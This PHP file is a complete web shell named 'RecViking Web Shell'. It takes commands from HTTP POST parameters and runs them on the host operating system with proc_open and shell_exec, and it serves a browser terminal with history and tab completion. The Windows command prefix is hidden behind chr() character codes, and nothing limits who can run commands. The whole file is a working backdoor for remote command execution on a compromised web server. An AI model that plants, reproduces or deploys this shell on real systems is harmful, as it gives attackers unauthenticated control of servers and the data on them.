<?php
set_time_limit(180);

$prewin = chr(37) . chr(67) . chr(111) . chr(109) . chr(83) . chr(112) . chr(101) . chr(99) . chr(37) . chr(32) . chr(47) . chr(99) . chr(32);
$prelin = "/usr/bin/bash -c ";
$pre = "";
$cwd = getcwd();
$needquotes = "";

if (isset($_POST["cwd"]) && $_POST["cwd"] !== ""){
	$cwd = $_POST["cwd"];
}

if (file_exists("C:\\")){
	$pre = $prewin;
	$pwdcmd = " & cd";
	$cdcmd = "cd \"" . $cwd . "\" & " . "cd \"" . $cwd . "\" & ";
}else{
	$pre = $prelin;
	$pwdcmd = " ; pwd ; ";
	$cdcmd = "cd \\\"" . $cwd . "\\\" ; ";
	$needquotes = "\"";
}

if (isset($_POST["c"])){
	header('Content-Type: application/json');

	$descriptors = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));
	$c = $pre .$needquotes . $cdcmd . $_POST["c"] . $pwdcmd . $needquotes;
	$cr = proc_open($c, $descriptors, $pipes);
	if(is_resource($cr)){
		while( proc_get_status($cr)["running"] == TRUE ){
			usleep(500);
		}
	}
	$sr = trim(stream_get_contents($pipes[1]), " \t\n\r\0\x0B");
	$er = trim(stream_get_contents($pipes[2]), " \t\n\r\0\x0B");
	$sr = trim($sr, " \t\n\r\0\x0B");

	while(strpos($sr, "\r") != FALSE){
		$sr = str_replace("\r", "\n", $sr);
	}
	while(strpos($sr, "\n\n") != FALSE){
		$sr = str_replace("\n\n", "\n", $sr);
	}
	if ($er == "" || !(isset($er)) || $er == NULL){
		$cwd = array_slice(explode("\n", $sr), -1)[0];
		$sr = trim(str_replace("\r\n", "\n", implode("\n",array_slice(explode("\n", $sr),0, -1))), " \t\n\r\0\x0B");
	}
	echo(json_encode(array("stdout" => $sr, "stderr" => $er, "error" => NULL, "debug_commands" => $c, "cwd" => $cwd)));
}elseif (isset($_POST["t"])){
	header('Content-Type: application/json');
	
	$t =  explode(" ", $_POST["t"]);
	
	$sr = "";
	$er = "";
	$c_debug = array();
	for($i = count($t); $i > 0; $i--){
		$tmpt = array_slice($t, $i - 1);
		$tmpt = implode(" ", $tmpt);
		if($pre == $prewin){
			$c = "dir /B \"" . $tmpt . "*\"";
		}else{
			
			if (strpos($tmpt, "/")){
				$tmpdirs = explode($tmpt, "/");
				if(count($tmpdirs) > 1 && substr($tmpdirs, -1) != "/"){
					$path_tmpt = implode("/", array_slice($tmpdirs, 0,-1));
					$tmpt = array_slice($tmpdirs, -1)[0];
					$safetmpt = str_replace("\\","\\\\",str_replace("\"","\\\"",str_replace(".", "\.", str_replace("[", "\\[", str_replace("(", "\\(", $tmpt)))));
					$c = "ls \\\"$path_tmpt\\\" | grep -i -e \\\"^$safetmpt\\\";";
				}else{
					$c = "ls \\\"$tmpt\\\";";
				}
			}else{
				$safetmpt = str_replace("\\","\\\\",str_replace("\"","\\\"",str_replace(".", "\.", str_replace("[", "\\[", str_replace("(", "\\(", $tmpt)))));
				$c = "ls | grep -i -e \\\"^$safetmpt\\\";";
			}
		}
		$c = $pre . $needquotes . $cdcmd . $c . $needquotes;
		$c_debug[] = $c;
		$sr .= "\n" . shell_exec($c);
	}

	$sr = trim($sr, " \t\n\r\0\x0B");
	while(strpos($sr, "\r") != FALSE){
		$sr = str_replace("\r", "\n", $sr);
	}
	while(strpos($sr, "\n\n") != FALSE){
		$sr = str_replace("\n\n", "\n", $sr);
	}
	$sr = trim($sr, " \t\n\r\0\x0B");

	if ($sr != ""){
		$sr = explode("\n", $sr);
		
		$er = "";
	}
	echo(json_encode(array("stdout" => $sr, "stderr" => $er, "debug_commands" => $c_debug)));
}else{
	$htmlgui = 
		"<!doctype html><html lang=en>" .
		"<head>" .
		"<meta charset='utf-8'>" .
		"<meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>" .
		"<title>RecViking Web Shell</title>" .
		"<link rel='stylesheet' href='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css'>" .
		"<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>" .
		"<script src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js'></script>" .
		"<script>localStorage.setItem('cmdHistory', JSON.stringify([])); localStorage.setItem('cmdCurrent', '');localStorage.setItem('cwd', '" . str_replace("\\","\\\\", $cwd) . "'); localStorage.setItem('cmdIndex', 0);</script>" .
		"<script>function unscrew(inval){var outval; outval = inval.replace(/\\n/gm,String.fromCharCode(10)).replace(/\\r/gm,String.fromCharCode(13)).replace(/\\t/g,String.fromCharCode(9)).replace(/\\\\/g,String.fromCharCode(92));return outval;}</script>" .
		"<script>function promptCheck() {if (document.getElementById('cmdin').value.charAt(0) != String.fromCharCode(62)){document.getElementById('cmdin').value=String.fromCharCode(62).concat(document.getElementById('cmdin').value);};}</script>" .
		"<script>function runcmd(cmdVal) {var tmparr = JSON.parse(localStorage.cmdHistory); if(tmparr[tmparr.length - 1] != cmdVal){tmparr.push(cmdVal)}; localStorage.cmdHistory = JSON.stringify(tmparr);localStorage.cmdIndex = 0;localStorage.cmdCurrent = cmdVal; $.post('" . $_SERVER['PHP_SELF']  . "', {c: cmdVal, cwd: localStorage.cwd}, function(data){if(data['error'] == null){if(data['stdout']){document.getElementById('cmdout').innerHTML += '<pre>' + unscrew(data['stdout']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';} if(data['stderr']){document.getElementById('cmdout').innerHTML += '<pre style=\'color: red;\'>' + unscrew(data['stderr']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';}$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);document.getElementById('cwd').innerHTML = data['cwd'];localStorage.cwd=data['cwd'];}else{document.getElementById('cmdout').innerHTML += '<pre style=\'color: red;\'>' + unscrew(data['error']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});};</script>" .
		"<script>function tabcomplete() {var cmdtmp = document.getElementById('cmdin').value.substring(1); $.post('" . $_SERVER['PHP_SELF']  . "', {t: cmdtmp, cwd: localStorage.cwd}, function(data){if(data['error'] == null && data['stderr'] == ''){if(data['stdout'].length == 1){var str = document.getElementById('cmdin').value.toLowerCase();var str2 = data['stdout'][0].toLowerCase();var lms = '';for(var i = 1;i <= str2.length;i++){var tmpsec = str2.substring(0,i);if(str.includes(tmpsec, str.length - tmpsec.length)){lms = tmpsec;}}document.getElementById('cmdin').value += data['stdout'][0].substring(lms.length);};document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" + data['stdout'] + \"</pre>\";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}else{document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" +  'tab completion failed: ' + data['error'] + \"</pre>\";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});}</script>" .
		"<style>" .
		"#mainwin { width: 800px; height: 600px; padding: 0.5em; background-color: black;}" .
		"#mainwin h3 { text-align: center; margin: 0; }" .
		"</style>" .
		"</head>" .
		"<body>" .
		"<div id='mainwin'>" .
		"<h3 class='ui-widget-header'>RecViking Web Shell (<span id='cwd'>" . $cwd . "</span>)</h3>" .
		"<div style='width: 100%; float: left; background-color: black; color: white;'>" .
		"<div id='cmdout' style='float: left; width: 100%; background-color: black; color: white; height: 560px; overflow-y: scroll; overflow-x: hidden'></div>" .
		"<input type='text'id='cmdin' style='float: left; background-color: black; color: white; width: 100%; border: 0px; padding 0px;' onchange='promptCheck()' oninput='promptCheck()' value='>'></input>" .
		"<script>document.getElementById('cmdin').addEventListener('keyup', function(event){if(event.keyCode === 13){var cmdvar=document.getElementById('cmdin').value.substr(1);document.getElementById('cmdout').innerHTML += '<pre>' + document.getElementById('cmdin').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';document.getElementById('cmdin').value='>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);runcmd(cmdvar);}else if(event.keyCode === 38){if(parseInt(localStorage.cmdIndex) == 0){localStorage.cmdCurrent = document.getElementById('cmdin').value.substr(1);}localStorage.cmdIndex = parseInt(localStorage.cmdIndex) + 1;if(parseInt(localStorage.cmdIndex) <= JSON.parse(localStorage.cmdHistory).length){document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}else{localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;}}else if(event.keyCode === 40){localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;if(parseInt(localStorage.cmdIndex) <= 0){document.getElementById('cmdin').value = '>' + localStorage.cmdCurrent;localStorage.cmdIndex = 0;}else{document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}}});</script>" .
		"<script>document.getElementById('cmdin').addEventListener('keydown', function(event){if(event.keyCode === 9){event.preventDefault(); tabcomplete();}});</script>" .
		"</div>" .
		"</div>" .
		"</body>";
	echo($htmlgui);
}
?>